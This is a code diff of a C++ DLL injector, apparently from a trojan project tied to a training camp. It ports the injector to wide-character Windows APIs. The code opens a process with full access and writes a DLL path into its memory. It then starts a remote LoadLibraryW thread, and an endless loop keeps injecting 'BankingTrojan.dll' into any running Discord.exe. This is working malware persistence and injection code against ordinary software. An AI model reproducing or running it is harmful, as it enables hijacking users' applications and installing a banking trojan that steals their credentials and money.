@@ -1,37 +1,33 @@
 #include"InjectDll.h"
-
-void inject(DWORD pid, char* dllname){
+#include<string.h>
+void inject(DWORD pid, wchar_t* dllname){
     // char dllname[150] = "C:\\Users\\rota1001\\Desktop\\T5Camp_2025_Trojan\\bin\\BankingTrojan.dll";
     HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    int size = strlen(dllname) + 5;
+    int size = wcslen(dllname) * sizeof(wchar_t) + 5;
+
 
     PVOID procdlladdr = VirtualAllocEx(hprocess, NULL, size, MEM_COMMIT, PAGE_READWRITE);
     if (procdlladdr == NULL) {
         printf("handle %p VirtualAllocEx failed\n", hprocess);
         return;
     }
-
     SIZE_T writenum;
     if (!WriteProcessMemory(hprocess, procdlladdr, dllname, size, &writenum)) {
         printf("handle %p WriteProcessMemory failed\n", hprocess);
         return;
     }
-    
-    FARPROC loadfuncaddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+    FARPROC loadfuncaddr = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
     if (!loadfuncaddr) {
         printf("handle %p GetProcAddress failed\n", hprocess);
         return;
     }
-    
     HANDLE hthread = CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)loadfuncaddr, (LPVOID)procdlladdr, 0, NULL);
     if (!hthread) {
         printf("handle %p CreateRemoteThread failed\n", hprocess);
         return;
     }
-  //  MessageBoxA(0, "success", "info", 0);
     CloseHandle(hthread);
     CloseHandle(hprocess);
-
     return;
 }
 
@@ -46,7 +42,7 @@ bool isRundll32(){
     return 0;
 }
 
-bool IsDllLoadedInProcess(DWORD pid, const std::string& dllName)
+bool IsDllLoadedInProcess(DWORD pid, const std::wstring& dllName)
 {
     HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
     if (hProcess == NULL)
@@ -67,10 +63,10 @@ bool IsDllLoadedInProcess(DWORD pid, const std::string& dllName)
     int numModules = cbNeeded / sizeof(HMODULE);
     for (int i = 0; i < numModules; i++)
     {
-        TCHAR szModName[MAX_PATH];
-        if (GetModuleFileNameEx(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR)))
+        wchar_t szModName[MAX_PATH];
+        if (GetModuleFileNameExW(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR)))
         {
-            std::string modName = szModName;
+            std::wstring modName = szModName;
             if (modName.find(dllName) != std::wstring::npos)
             {
                 CloseHandle(hProcess);
@@ -83,31 +79,31 @@ bool IsDllLoadedInProcess(DWORD pid, const std::string& dllName)
     return false;
 }
 
-void injectionLoop(char* dllPath){
+void injectionLoop(wchar_t* dllPath){
     while(1){
         bool hasdll = 0;
         HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (hSnapshot == INVALID_HANDLE_VALUE) {
             continue;
         }
-        PROCESSENTRY32 pe;
-        pe.dwSize = sizeof(PROCESSENTRY32);
-        if (Process32First(hSnapshot, &pe)) {
+        PROCESSENTRY32W pe;
+        pe.dwSize = sizeof(PROCESSENTRY32W);
+        if (Process32FirstW(hSnapshot, &pe)) {
             do {
-                std::string currentProcessName = pe.szExeFile;
-                if (currentProcessName == "Discord.exe" && IsDllLoadedInProcess(pe.th32ProcessID, "BankingTrojan.dll")) {
+                std::wstring currentProcessName = pe.szExeFile;
+                if (currentProcessName == L"Discord.exe" && IsDllLoadedInProcess(pe.th32ProcessID, L"BankingTrojan.dll")) {
                     hasdll = 1;
                 }
-            } while (Process32Next(hSnapshot, &pe));
+            } while (Process32NextW(hSnapshot, &pe));
         }
-        if(!hasdll && Process32First(hSnapshot, &pe)){
+        if(!hasdll && Process32FirstW(hSnapshot, &pe)){
             do {
-                std::string currentProcessName = pe.szExeFile;
-                if (currentProcessName == "Discord.exe") {
+                std::wstring currentProcessName = pe.szExeFile;
+                if (currentProcessName == L"Discord.exe") {
                     inject(pe.th32ProcessID, dllPath);
                     break;
                 }
-            } while (Process32Next(hSnapshot, &pe));
+            } while (Process32NextW(hSnapshot, &pe));
         }
         CloseHandle(hSnapshot);
     }
